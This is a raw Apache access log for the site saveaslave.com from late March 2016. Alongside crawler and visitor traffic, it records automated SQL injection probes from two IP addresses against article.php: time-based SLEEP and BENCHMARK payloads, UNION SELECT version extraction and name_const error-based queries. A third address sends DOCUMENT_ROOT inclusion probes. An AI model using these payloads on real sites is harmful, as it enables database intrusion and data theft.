66.220.146.31 - - [30/Mar/2016:18:10:12 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "www.saveaslave.com"
88.198.230.79 - - [31/Mar/2016:11:24:02 -0700] "GET /?tpl=references&Itemid=3 HTTP/1.1" 200 88630 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "www.saveaslave.com"
88.198.230.79 - - [31/Mar/2016:11:24:06 -0700] "GET / HTTP/1.1" 200 88630 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "www.saveaslave.com"[0]
5.9.111.70 - - [31/Mar/2016:11:24:22 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "saveaslave.com"
83.220.236.82 - - [31/Mar/2016:11:43:22 -0700] "GET /images/article/article7.jpg HTTP/1.1" 200 15527 "-" "Yandex Search Plugin Android/315" "saveaslave.com"
65.36.241.48 - - [31/Mar/2016:11:44:07 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:45 -0700] "GET /article.php?id=15'\" HTTP/1.1" 200 56243 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:45 -0700] "GET /article.php?id=15 HTTP/1.1" 200 56239 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:46 -0700] "GET /article.php?id=152121121121212.1 HTTP/1.1" 200 776 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:47 -0700] "GET /article.php?id=15%20and%201%3D1 HTTP/1.1" 200 56247 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:50 -0700] "GET /article.php?id=15\"%20and%20\"x\"%3D\"x HTTP/1.1" 200 56255 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:51 -0700] "GET /article.php?id=15%20AND%201=1 HTTP/1.1" 200 56247 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)" "saveaslave.com"[0]
77.74.51.122 - - [31/Mar/2016:11:59:51 -0700] "GET /article.php?id=15 HTTP/1.1" 200 56239 "-" "Opera/9.27" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:52 -0700] "GET /article.php?id=15%20AnD%20SLeeP%283%29 HTTP/1.1" 200 56252 "-" "Opera/9.27" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:52 -0700] "GET /article.php?id=15%27%20AnD%20sLeep%283%29%20ANd%20%271 HTTP/1.1" 200 56262 "-" "Opera/9.27" "saveaslave.com"[0]
77.74.51.122 - - [31/Mar/2016:11:59:54 -0700] "GET /article.php?id=15%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271 HTTP/1.1" 200 56277 "-" "Opera/9.27" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:54 -0700] "GET /article.php?id=15999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1 HTTP/1.1" 200 776 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:11:59:55 -0700] "GET /article.php?id=1599999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x HTTP/1.1" 200 776 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:12:00:15 -0700] "GET /article.php?id=15' HTTP/1.1" 200 56241 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)" "saveaslave.com"
77.74.51.122 - - [31/Mar/2016:12:02:36 -0700] "GET /article.php?id=15%27%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%27x%27=%27x HTTP/1.0" 200 56398 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)" "saveaslave.com"
193.201.227.56 - - [31/Mar/2016:12:28:37 -0700] "GET /addlink.php HTTP/1.1" 200 12853 "http://saveaslave.com/addlink.php" "Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0" "saveaslave.com"
5.9.153.124 - - [31/Mar/2016:12:30:47 -0700] "GET //?_SERVER[DOCUMENT_ROOT]=?? HTTP/1.1" 200 88630 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" "saveaslave.com"[0]
164.132.161.48 - - [31/Mar/2016:12:32:46 -0700] "GET /articles/modernslavery.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "www.saveaslave.com"[0]
5.9.153.124 - - [31/Mar/2016:12:43:06 -0700] "GET /country.php%3Fname%3DDjibouti%26lang%3Den&amp;sa=U&amp;ved=0ahUKEwii4OGkz-vLAhUKBywKHcTGB_Y4ZBAWCIcDMEs&amp;usg=AFQjCNEcOajAEKvsweMxerb3Q0u5vaRm0g//?_SERVER[DOCUMENT_ROOT]=%034Lost!!!?? HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" "saveaslave.com"
5.9.153.124 - - [31/Mar/2016:12:43:12 -0700] "GET //?_SERVER[DOCUMENT_ROOT]=?? HTTP/1.1" 200 88630 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" "saveaslave.com"[1]
164.132.161.94 - - [31/Mar/2016:13:20:43 -0700] "GET /new-zealand.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "www.saveaslave.com"
65.36.241.48 - - [31/Mar/2016:13:34:11 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
208.115.113.86 - - [31/Mar/2016:13:41:41 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
180.76.15.20 - - [31/Mar/2016:13:43:18 -0700] "GET /images/supporters/Thumbs.db HTTP/1.1" 200 305664 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"
123.125.71.88 - - [31/Mar/2016:14:38:25 -0700] "GET / HTTP/1.1" 200 88630 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4" "www.saveaslave.com"
123.125.71.74 - - [31/Mar/2016:14:38:26 -0700] "GET /css/elements.css HTTP/1.1" 304 - "http://www.saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4" "www.saveaslave.com"[0]
123.125.71.80 - - [31/Mar/2016:14:38:26 -0700] "GET /css/style.css HTTP/1.1" 304 - "http://www.saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4" "www.saveaslave.com"
123.125.71.76 - - [31/Mar/2016:14:38:26 -0700] "GET /assets/js/ie-emulation-modes-warning.js HTTP/1.1" 200 2130 "http://www.saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4" "www.saveaslave.com"[0]
123.125.71.82 - - [31/Mar/2016:14:38:26 -0700] "GET /css/bootstrap.min.css HTTP/1.1" 304 - "http://www.saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4" "www.saveaslave.com"
123.125.71.109 - - [31/Mar/2016:14:38:35 -0700] "GET /gajaxscroller.js HTTP/1.1" 200 9774 "http://www.saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4" "www.saveaslave.com"
123.125.71.74 - - [31/Mar/2016:14:38:37 -0700] "GET /css/bootstrap.min.css HTTP/1.1" 304 - "http://www.saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4" "www.saveaslave.com"
123.125.71.81 - - [31/Mar/2016:14:38:38 -0700] "GET /css/elements.css HTTP/1.1" 304 - "http://www.saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4" "www.saveaslave.com"
208.115.113.86 - - [31/Mar/2016:14:44:47 -0700] "GET /article.php?id=63 HTTP/1.1" 200 45559 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"[0]
65.36.241.48 - - [31/Mar/2016:15:11:42 -0700] "GET / HTTP/1.1" 200 88630 "-" "InternetSeer.com" "www.saveaslave.com"
52.26.231.126 - - [31/Mar/2016:15:54:57 -0700] "GET /article.php?id=842121121121212.1 HTTP/1.1" 200 776 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)" "www.saveaslave.com"[0]
52.26.231.126 - - [31/Mar/2016:15:54:59 -0700] "GET /article.php?id=84%20AnD%20SLeeP%283%29 HTTP/1.1" 200 776 "-" "Opera/9.27" "www.saveaslave.com"
52.26.231.126 - - [31/Mar/2016:15:54:59 -0700] "GET /article.php?id=84%26%26SlEEp%283%29 HTTP/1.1" 200 776 "-" "Opera/9.27" "www.saveaslave.com"[0]
52.26.231.126 - - [31/Mar/2016:15:54:59 -0700] "GET /article.php?id=84%27%20AnD%20sLeep%283%29%20ANd%20%271 HTTP/1.1" 200 776 "-" "Opera/9.27" "www.saveaslave.com"
52.26.231.126 - - [31/Mar/2016:15:55:00 -0700] "GET /article.php?id=84%20AnD%20BeNChMaRK%282999999%2CMD5%28NOW%28%29%29%29 HTTP/1.1" 200 776 "-" "Opera/9.27" "www.saveaslave.com"[0]
52.26.231.126 - - [31/Mar/2016:15:55:00 -0700] "GET /article.php?id=84%26%26BeNChMaRK%282999999%2CMD5%28NOW%28%29%29%29 HTTP/1.1" 200 776 "-" "Opera/9.27" "www.saveaslave.com"[0]
52.26.231.126 - - [31/Mar/2016:15:55:00 -0700] "GET /article.php?id=84%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271 HTTP/1.1" 200 776 "-" "Opera/9.27" "www.saveaslave.com"[0]
52.26.231.126 - - [31/Mar/2016:15:55:01 -0700] "GET /article.php?id=8499999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x HTTP/1.1" 200 776 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)" "www.saveaslave.com"[0]
52.26.231.126 - - [31/Mar/2016:15:55:02 -0700] "GET /article.php?id=84%27%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%27x%27=%27x HTTP/1.1" 200 776 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:28 -0700] "GET /css/elements.css HTTP/1.1" 200 17857 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:28 -0700] "GET /gfeedfetcher.js HTTP/1.1" 200 9018 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:28 -0700] "GET /assets/js/ie-emulation-modes-warning.js HTTP/1.1" 200 2130 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:29 -0700] "GET /gajaxscroller.js HTTP/1.1" 200 9774 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:29 -0700] "GET /images/top.jpg HTTP/1.1" 200 50519 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:30 -0700] "GET /images/article/suspects.jpg HTTP/1.1" 200 58796 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:30 -0700] "GET /images/social3.png HTTP/1.1" 200 4343 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:31 -0700] "GET /css/down-arrow.png HTTP/1.1" 404 89 "http://www.saveaslave.com/css/elements.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:41 -0700] "GET /who-we-are.php HTTP/1.1" 200 50792 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"[0]
96.224.251.206 - - [31/Mar/2016:17:04:42 -0700] "GET /images/article5.jpg HTTP/1.1" 200 14497 "http://www.saveaslave.com/who-we-are.php" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
96.224.251.206 - - [31/Mar/2016:17:04:43 -0700] "GET /images/top-1.jpg HTTP/1.1" 200 77341 "http://www.saveaslave.com/who-we-are.php" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36" "www.saveaslave.com"
85.93.91.84 - - [31/Mar/2016:17:24:20 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DeuSu/5.0.2; +https://deusu.de/robot.html)" "www.saveaslave.com"
65.36.241.48 - - [31/Mar/2016:17:57:58 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
